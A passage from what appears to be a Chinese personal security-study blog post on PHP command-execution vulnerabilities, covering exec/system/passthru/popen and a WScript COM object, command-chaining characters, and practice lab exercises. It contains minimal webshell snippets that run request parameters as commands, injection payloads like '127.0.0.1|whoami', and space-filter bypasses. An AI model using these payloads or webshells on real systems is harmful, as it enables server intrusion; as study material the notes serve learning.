+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"><span class="variable">$array</span>=<span class="keyword">array</span>(<span class="string">&#x27;www&#x27;</span>,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;phpernote&#x27;</span>,<span class="string">&#x27;com&#x27;</span>);    </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$array</span>[&#x27;name&#x27;]&quot;</span>;<span class="comment">//用此句会报语法错误    </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$array[&#x27;name&#x27;]&#125;</span>&quot;</span>;<span class="comment">//此句正常，大括号内的字符将作为变量来处理</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<ul>
+<li>所以总的来说<code>&#123;$&#123;phpinfo()&#125;&#125;</code>就是执行了<code>phpinfo()</code>这个函数</li>
+</ul>
+</blockquote>
+<h2 id="PHP系统命令执行函数"><a href="#PHP系统命令执行函数" class="headerlink" title="PHP系统命令执行函数"></a>PHP系统命令执行函数</h2><blockquote>
+<p>学习此类函数的最直接的方法就是去查找官方php文档，<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.php.net/manual/zh/index.php">PHP: PHP 手册 - Manual</a><br>然后再去搜索相应的需要知道的知识</p>
+</blockquote>
+<p>命令执行相关函数：</p>
+<ul>
+<li><code>system()</code>：执行外部程序，并且显示输出；</li>
+<li><code>exec()</code>：执行一个外部程序</li>
+<li><code>shell_exec()</code>：通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</li>
+<li><code>passthru()</code>：执行unix系统命令并且显示原始输出</li>
+<li><code>pcntl_exec()</code>：在当前进程空间执行指定程序</li>
+<li><code>popen()</code>：打开进程文件指针</li>
+<li><code>proc_open()</code>：执行一个命令，并且打开用来输入&#x2F;输出的文件指针。</li>
+</ul>
+<p>PHP提供4个专门的执行外部命令的函数：</p>
+<ul>
+<li><code>exec()</code> </li>
+<li><code>system()</code> </li>
+<li><code>passthru()</code> </li>
+<li><code>shell_exec()</code></li>
+</ul>
+<h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a><code>exec()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">array</span> &amp;<span class="variable">$output</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ]] )</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>执行一个外部程序，<code>exec()</code> 执行 <code>command</code> 参数所指定的命令。<code>exec</code>执行系统外部命令时不会输出结果，而是<strong>返回结果的最后一行</strong>。如果想得到结果，可以使用第二个参数，让其输出到指定的数组。此数组一个记录代表输出的一行。即如果输出结果有20行，则这个数组就有20条记录，所以如果需要反复输出调用不同系统外部命令的结果，最好在输出每一条系统外部命令结果时清空这个数组unset($output) ，以防混乱。第三个参数用来取得命令执行的状态码，通常执行成功都是返回0。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 输出运行中的 php/httpd 进程的创建者用户名</span></span><br><span class="line"><span class="comment">// （在可以执行 &quot;whoami&quot; 命令的系统上）</span></span><br><span class="line"><span class="comment">// echo exec(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="comment">// exec(&#x27;ls -la&#x27;, $return);</span></span><br><span class="line"><span class="comment">// var_dump($return);</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">@<span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$return</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$return</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<ul>
+<li><code>var_dump()</code> — 在php种用来打印变量的相关信息</li>
+</ul>
+<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211141847390.png" alt="image-20221114184703985" style="zoom:33%;" />
+
+<h3 id="system"><a href="#system" class="headerlink" title="system()"></a><code>system()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ] )</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>函数执行 <code>command</code> 参数所指定的命令， 并且输出执行结果。<code>system</code>和<code>exec</code>的区别在于，<code>system</code>在执行系统外部命令时，直接将结果输出到浏览器，如果执行命令成功则返回true，否则返回false。第二个参数与<code>exec</code>第三个参数含义一样。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">// 输出 shell 命令 &quot;ls&quot; 的返回结果</span></span><br><span class="line"><span class="comment">// 并且将输出的最后一样内容返回到 $last_line。</span></span><br><span class="line"><span class="comment">// 将命令的返回值保存到 $retval。</span></span><br><span class="line"><span class="variable">$last_line</span> = <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>, <span class="variable">$retval</span>);</span><br><span class="line"><span class="comment">// 打印更多信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&lt;hr /&gt;Last line of the output: &#x27;</span> . <span class="variable">$last_line</span> . <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;hr /&gt;Return value: &#x27;</span> . <span class="variable">$retval</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><code>passthru()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ] )</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li>执行外部程序并且显示<strong>原始输出</strong>,同<code>exec()</code>函数类似，<code>passthru()</code> 函数 也是用来执行外部命令（<code>command</code>）的。。如果要获取一个命令未经任何处理的原始输出， 请使用 <code>passthru()</code> 函数。当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 <code>exec()</code> 或 <code>system()</code> 函数。</li>
+<li>passthru与system的区别：passthru直接将结果输出到浏览器，不返回任何值，且其可以输出二进制，比如图像数据。第二个参数可选，是状态码。</li>
+</ul>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;ls -la&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//c.runoob.com/compile/1/</span></span><br><span class="line">在线执行结果：</span><br><span class="line">total <span class="number">12</span></span><br><span class="line">drwx------  <span class="number">2</span> <span class="number">882978</span> <span class="number">882978</span> <span class="number">4096</span> Mar <span class="number">25</span> <span class="number">06</span>:<span class="number">11</span> .</span><br><span class="line">drwxr-xr-x <span class="number">11</span> root   root    <span class="number">220</span> Mar <span class="number">25</span> <span class="number">06</span>:<span class="number">11</span> ..</span><br><span class="line">-rw-r--r--  <span class="number">1</span> <span class="number">882978</span> <span class="number">882978</span>   <span class="number">40</span> Mar <span class="number">25</span> <span class="number">06</span>:<span class="number">11</span> run</span><br><span class="line">-rw-r--r--  <span class="number">1</span> <span class="number">882978</span> <span class="number">882978</span>   <span class="number">66</span> Mar <span class="number">25</span> <span class="number">06</span>:<span class="number">11</span> script.php</span><br><span class="line">&lt;pre&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a><code>shell_exec()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">shell_exec</span> ( <span class="keyword">string</span> <span class="variable">$cmd</span> )</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。本函数同执行操作符（&#96;&#96;）.</p>
+<p>注意：当 PHP 运行在 安全模式 时，不能使用此函数。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ls -lart&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a><code>popen()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">popen</span> ( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">string</span> <span class="variable">$mode</span> )</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>打开进程文件指针，打开一个指向进程的管道，该进程由派生给定的 <code>command</code> 命令执行而产生。只能打开单向管道，不是’r’就是’w’；并且需要使用 <code>pclose()</code> 来关闭。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fd</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&quot;whoami&quot;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fd</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line"><span class="comment">// $fd = popen(&quot;systeminfo &gt; D:\\1.txt&quot;, &#x27;r&#x27;);</span></span><br><span class="line"><span class="comment">// pclose($fd);</span></span><br><span class="line"><span class="comment">// print(fgets(fopen(&quot;d:\\1.txt&quot;,&#x27;r&#x27;)));</span></span><br><span class="line"><span class="comment">// $handle = fopen(&quot;D:\\1.txt&quot;, &quot;r&quot;);</span></span><br><span class="line"><span class="comment">// $contents = fread($handle, 100000);</span></span><br><span class="line"><span class="comment">// fclose($handle);</span></span><br><span class="line"><span class="comment">// echo &quot;&lt;pre&gt;$contents&lt;/pre&gt;&quot;;</span></span><br><span class="line"><span class="comment">// $fd = popen(&quot;ipconfig&quot;,&#x27;r&#x27;);</span></span><br><span class="line"><span class="comment">// while($s=fgets($fd))&#123;</span></span><br><span class="line"><span class="comment">//  echo &quot;&lt;pre&gt;$s&lt;/pre&gt;&quot;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="windows-com对象"><a href="#windows-com对象" class="headerlink" title="windows com对象"></a><code>windows com</code>对象</h3><p><code>COM</code>即组件对象模型，是<code>Component Object Model</code>取前三个字母的缩写，这三个字母在当今Windows的世界中随处可见。随时涌现出来的大把大把的新技术都以<code>COM</code>为基础。各种文档中也充斥着诸如<code>COM</code>对象、接口、服务器之类的术语。因此，对于一个程序员来说，不仅要掌握使用COM的方法，而且还要彻底熟悉<code>COM</code>的所有一切。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$command</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$wsh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>); <span class="comment">// 生成一个COM对象 Shell.Application也能</span></span><br><span class="line"><span class="variable">$exec</span> = <span class="variable">$wsh</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;cmd /c&quot;</span>.<span class="variable">$command</span>); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line"><span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line"><span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stroutput</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="命令执行常用特殊字符（并行执行两条命令）"><a href="#命令执行常用特殊字符（并行执行两条命令）" class="headerlink" title="命令执行常用特殊字符（并行执行两条命令）"></a>命令执行常用特殊字符（并行执行两条命令）</h2><ul>
+<li><code>cmd1|cmd2</code>：无论<code>cmd1</code>是否执行成功，<code>cmd2</code>将被执行</li>
+<li><code>cmd1;cmd2</code>：无论<code>cmd1</code>是否执行成功，<code>cmd2</code>将被执行</li>
+<li><code>cmd1||cmd2</code>：仅在<code>cmd1</code>执行失败时才执行<code>cmd2</code>，执行正确时就只显示<code>cmd1</code></li>
+<li><code>cmd1&amp;&amp;cmd2</code>：仅在<code>cmd1</code>执行成功后时才执行<code>cmd2</code></li>
+<li><code>$(cmd)</code> ：如：<code>echo $(whoami)</code> 或者 <code>$(touch test.sh; echo &#39;ls&#39; &gt; test.sh)</code></li>
+<li><code>&#39;cmd&#39;</code>：用于执行特定命令，如 <code>&#39;whoami&#39;</code></li>
+<li><code>&gt;(cmd)：&lt;(ls)</code></li>
+<li><code>&lt;(cmd)：&gt;(ls)</code>——————————————不是很懂这个地方什么意思</li>
+</ul>
+<blockquote>
+<p>注意：Linux中使用<code>$</code>符号来执行命令，在Linux终端中，输入<code>$(whoami)</code>，意思就是相当于我们在Linux输入<code>whoami</code>一样</p>
+</blockquote>
+<h2 id="其他PHP危险函数"><a href="#其他PHP危险函数" class="headerlink" title="其他PHP危险函数"></a>其他PHP危险函数</h2><h3 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h3><ul>
+<li><code>require()</code></li>
+<li><code>include()</code></li>
+<li><code>require_once()</code></li>
+<li><code>include_once()</code></li>
+</ul>
+<h3 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h3><ul>
+<li><code>copy()</code>————————拷贝文件</li>
+<li><code>file_get_contents()</code>———将整个文件读入一个字符串</li>
+<li><code>file_put_contents()</code>———将一个字符串写入文件</li>
+<li><code>file()</code>—————————-把整个文件读入一个数组中</li>
+<li><code>fopen()</code>————————打开文件或者url</li>
+<li><code>move_uploaded_file()</code>—-将上传的文件移动到新位置</li>
+<li><code>readfile()</code>———————-输出文件</li>
+<li><code>rename()</code>———————重命名一个文件或目录</li>
+<li><code>rmdir()</code>————————删除目录</li>
+<li><code>unlink &amp; delete()</code>———–删除文件</li>
+</ul>
+<h1 id="命令执行漏洞利用练习"><a href="#命令执行漏洞利用练习" class="headerlink" title="命令执行漏洞利用练习"></a>命令执行漏洞利用练习</h1><h2 id="命令执行例1"><a href="#命令执行例1" class="headerlink" title="命令执行例1"></a>命令执行例1</h2><blockquote>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://120.27.61.239:8008/source/index10.php">http://120.27.61.239:8008/source/index10.php</a></p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">未对用户输入的参数ip做任何过滤。</span><br><span class="line">构造payload：</span><br><span class="line">127.0.0.1&amp;&amp;whoami</span><br><span class="line">127.0.0.1;whoami</span><br><span class="line">127.0.0.1|whoami</span><br><span class="line">test||whoami</span><br><span class="line">test&amp;whoami</span><br></pre></td></tr></table></figure>
+
+<h2 id="命令执行例2"><a href="#命令执行例2" class="headerlink" title="命令执行例2"></a>命令执行例2</h2><blockquote>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://120.27.61.239:8008/source/index11.php">http://120.27.61.239:8008/source/index11.php</a></p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">黑名单机制。简单替换输入数据中的 &amp;&amp; 和 ; 为空</span><br><span class="line">黑名单机制时有缺陷，因为不可能枚举出所有的特殊连接命令字符</span><br><span class="line">构造payload：</span><br><span class="line">127.0.0.1&amp;;&amp;whoami</span><br><span class="line">127.0.0.1|whoami</span><br><span class="line">test||whoami</span><br><span class="line">test|;|whoami</span><br><span class="line">test&amp;whoami</span><br><span class="line"></span><br><span class="line">在Linux中执行命令就需要使用空格，但是如果空格被过滤了呢？？？</span><br><span class="line">那么我们便需要绕过空格</span><br><span class="line">Linux shell中绕过空格：</span><br><span class="line">&lt; 、&lt;&gt;、$IFS$9、$&#123;IFS&#125;、$IFS、$IFS[*]、$IFS[@]等</span><br><span class="line"></span><br><span class="line">root@VM-16-6-ubuntu:~# echo 123 &gt; 1.txt</span><br><span class="line">root@VM-16-6-ubuntu:~# cat 1.txt</span><br><span class="line">123</span><br><span class="line">root@VM-16-6-ubuntu:~# cat&lt;1.txt</span><br><span class="line">123</span><br><span class="line">root@VM-16-6-ubuntu:~# cat$IFS$91.txt</span><br><span class="line">123</span><br><span class="line">root@VM-16-6-ubuntu:~#</span><br></pre></td></tr></table></figure>
+
+<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211142042350.png" alt="image-20221114204202930" style="zoom:50%;" />
+
+
+
+<h2 id="命令执行例3"><a href="#命令执行例3" class="headerlink" title="命令执行例3"></a>命令执行例3</h2><blockquote>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://120.27.61.239:8008/source/index12.php">http://120.27.61.239:8008/source/index12.php</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">比较严格的黑名单机制；</span><br><span class="line">未过滤特殊字符：&quot;|&quot;。</span><br><span class="line">构造payload：</span><br><span class="line">127.0.0.1|whoami</span><br></pre></td></tr></table></figure>
+
+<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="反弹Shell简介"><a href="#反弹Shell简介" class="headerlink" title="反弹Shell简介"></a>反弹Shell简介</h2><h3 id="什么是正向shell"><a href="#什么是正向shell" class="headerlink" title="什么是正向shell"></a>什么是正向shell</h3><blockquote>
+<p>正向shell：控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。</p>
+</blockquote>
+<h3 id="什么是反向shell"><a href="#什么是反向shell" class="headerlink" title="什么是反向shell"></a>什么是反向shell</h3><blockquote>
+<p>反向shell（反弹shell）：被控端主动发起连接请求去连接控制端。通常被控端由于防火墙限制、权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包，导致正向shell连不上，只能使用反向shell连接被控端</p>
+</blockquote>
+<h2 id="Linux反弹shell"><a href="#Linux反弹shell" class="headerlink" title="Linux反弹shell"></a>Linux反弹shell</h2><blockquote>
+</blockquote>
+<h2 id="Windows反弹shell"><a href="#Windows反弹shell" class="headerlink" title="Windows反弹shell"></a>Windows反弹shell</h2><blockquote>
+</blockquote>
+<hr>
+<h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote>
+<ul>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://bealright.github.io/2019/08/10/DVWA%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">DVWA——命令执行漏洞学习 · Lemon’s blog (bealright.github.io)</a></li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/qq_43431158/article/details/99673451">PHP危险函数总结_lemonl1的博客-CSDN博客_php命令执行的危险函数</a></li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/qq_42804678/article/details/91346116">正则里的(.<em>?)是什么意思_Pikachu_simple的博客-CSDN博客_正则</em>?</a></li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/weixin_34315189/article/details/94527200">正则表达式贪婪性—点星（.*） 20190618_weixin_34315189的博客-CSDN博客</a></li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/weixin_43749601/article/details/113417093">preg_replace() &#x2F;e代码执行漏洞_2021！的博客-CSDN博客</a></li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.w3schools.cn/php/php_regex.asp#:~:text=">PHP 正则表达式 (w3schools.cn)</a></li>
+</ul>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://gungnir.top/">晚上十一点睡觉</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://gungnir.top/posts/34204/">http://gungnir.top/posts/34204/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://gungnir.top" target="_blank">晚上十一点睡觉のBlog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a><a class="post-meta__tags" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a></div><div class="post_share"><div class="social-share" data-image="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237504.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/1811/"><img class="prev-cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237569.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">常见中间件解析漏洞</div></div></a></div><div class="next-post pull-right"><a href="/posts/46563/"><img class="next-cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237531.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">正则表达式</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/61475/" title="0x09 - Web安全基础-Windows反弹shell"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308751.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-14</div><div class="title">0x09 - Web安全基础-Windows反弹shell</div></div></a></div><div><a href="/posts/20558/" title="0x09 - Web安全基础-Linux反弹shell"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237566.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-14</div><div class="title">0x09 - Web安全基础-Linux反弹shell</div></div></a></div><div><a href="/posts/5917/" title="常见Webshell"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308745.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-13</div><div class="title">常见Webshell</div></div></a></div><div><a href="/posts/65078/" title="Web安全基础知识"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308736.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-16</div><div class="title">Web安全基础知识</div></div></a></div><div><a href="/posts/39231/" title="0x07 - Web安全基础-SQL注入"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237574.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-16</div><div class="title">0x07 - Web安全基础-SQL注入</div></div></a></div><div><a href="/posts/29509/" title="Sqlmap学习"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308767.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-11</div><div class="title">Sqlmap学习</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151640204.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">晚上十一点睡觉</div><div class="author-info__description">晚上十一点睡觉的个人博客，个人笔记及日志，最近在学习网络安全和Python</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">109</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">59</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">41</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/11pmsleep"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/11pmsleep" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:860637048@qq.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=860637048" rel="external nofollow noreferrer" target="_blank" title="qq"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">笔记迁移整理中~~~以前习惯有道云记笔记，整理知识也算沉淀自己的一部分吧·· 加油··stay passionate and never say die!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">命令执行漏洞简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.1.1.</span> <span class="toc-text">原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.1.2.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.3.</span> <span class="toc-text">远程代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.4.</span> <span class="toc-text">系统命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">PHP代码执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eval"><span class="toc-number">1.2.1.</span> <span class="toc-text">eval()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#assert"><span class="toc-number">1.2.2.</span> <span class="toc-text">assert()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-replace"><span class="toc-number">1.2.3.</span> <span class="toc-text">preg_replace()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#array-map"><span class="toc-number">1.2.4.</span> <span class="toc-text">array_map()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#create-function"><span class="toc-number">1.2.5.</span> <span class="toc-text">create_function()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#call-user-func"><span class="toc-number">1.2.6.</span> <span class="toc-text">call_user_func</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#call-user-func-array"><span class="toc-number">1.2.7.</span> <span class="toc-text">call_user_func_array</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#array-filter"><span class="toc-number">1.2.8.</span> <span class="toc-text">array_filter</span></a></li><li 